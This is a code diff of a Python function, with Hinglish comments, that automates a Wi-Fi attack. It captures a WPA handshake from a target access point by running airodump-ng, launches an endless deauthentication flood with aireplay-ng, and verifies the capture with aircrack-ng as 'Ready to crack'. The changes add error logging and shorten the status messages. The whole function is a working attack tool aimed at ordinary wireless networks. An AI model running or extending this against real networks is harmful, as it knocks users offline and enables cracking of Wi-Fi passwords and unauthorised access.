@@ -4,10 +4,9 @@ import time
 
 def launch_attack(bssid, channel, interface='wlan0mon'):
     try:
-        # Channel ko clean karo (agar ,11 wala aaye toh sirf 1 le lo)
         clean_channel = str(channel).split(',')[0]
         
-        # 1. Safai (Cleanup): Pehle koi chalta hua airodump ya aireplay kill karo
+        # 1. Background processes kill karo
         subprocess.run(['pkill', 'airodump-ng'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         subprocess.run(['pkill', 'aireplay-ng'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(2)
@@ -22,37 +21,46 @@ def launch_attack(bssid, channel, interface='wlan0mon'):
                 except:
                     pass
             
-        # 2. airodump-ng start karo
+        # 2. airodump-ng ko start karo aur uski errors ko ek file mein save karo
+        err_log = open("/tmp/awb_err.log", "w")
         airodump = subprocess.Popen(['airodump-ng', '-c', clean_channel, '--bssid', bssid, '-w', capture_file, '--ignore-negative-one', interface], 
-                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                                    stdout=subprocess.DEVNULL, stderr=err_log)
         
-        time.sleep(5) # airodump ko channel set hone do
+        time.sleep(5) # 5 seconds tak usko chalne do
         
-        # 3. Infinite Deauth Attack (-0 0) background mein start karo
+        # Agar airodump 5 seconds mein hi mar jaye, toh error read karo
+        if airodump.poll() is not None:
+            err_log.close()
+            with open("/tmp/awb_err.log", "r") as f:
+                error_text = f.read()
+            return {"status": "error", "message": f"airodump-ng failed to start. Reason: {error_text}"}
+        
+        # 3. Infinite Deauth Attack start karo
         aireplay = subprocess.Popen(['aireplay-ng', '-0', '0', '-a', bssid, '--ignore-negative-one', interface], 
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
         # 60 seconds tak capture hone do
         time.sleep(60)
         
-        # Dono processes ko band karo
+        # Band karo
         aireplay.terminate()
         airodump.terminate()
         airodump.wait()
-        time.sleep(3) # File save hone do
+        err_log.close()
+        time.sleep(3)
         
         cap_file_path = capture_file + "-01.cap"
         if not os.path.exists(cap_file_path):
-            return {"status": "error", "message": "Attack failed. airodump-ng could not start. Check terminal manually."}
+            return {"status": "error", "message": "Capture file not generated. Unknown error."}
         
         # 4. Handshake Verify Karna
         verify = subprocess.run(['aircrack-ng', cap_file_path], capture_output=True, text=True)
         output = verify.stdout
         
         if "1 handshake" in output:
-            return {"status": "success", "message": "VERIFIED! Handshake captured successfully! Ready to crack.", "cap_file": cap_file_path}
+            return {"status": "success", "message": "VERIFIED! Handshake captured successfully! Ready to crack."}
         else:
-            return {"status": "error", "message": "Attack finished but NO HANDSHAKE captured. Try again when target is using internet.", "cap_file": cap_file_path}
+            return {"status": "error", "message": "Attack finished but NO HANDSHAKE captured. Try again."}
             
     except Exception as e:
         return {"status": "error", "message": str(e)}
